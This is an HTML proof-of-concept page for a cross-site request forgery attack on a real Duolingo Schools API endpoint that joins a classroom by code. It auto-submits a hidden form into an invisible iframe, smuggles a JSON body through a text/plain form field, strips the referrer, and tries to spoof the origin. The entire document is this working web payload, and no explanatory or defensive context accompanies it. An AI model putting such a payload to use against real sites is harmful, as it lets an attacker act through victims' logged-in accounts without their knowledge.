<html>
  <body>
    <h1>CSRF PoC - Join Classroom</h1>
    <iframe id="hiddenFrame" name="hiddenFrame" style="display:none"></iframe>
    
    <form id="csrfForm" 
          action="https://schools.duolingo.com/api/1/observers/join_classroom_by_code" 
          method="POST" 
          target="hiddenFrame"
          enctype="text/plain">
      <input type="hidden" name='{"link_code":"dvvscc","' value='dummy"}'>
    </form>

    <script>
      // Spoof critical headers using meta tags
      const meta = document.createElement('meta');
      meta.name = "referrer";
      meta.content = "no-referrer";
      document.head.appendChild(meta);

      // Add Origin-spoofing exception (only works in some browsers)
      try {
        window.history.replaceState({}, '', 'https://www.duolingo.com/');
      } catch(e) {}

      // Submit form automatically
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
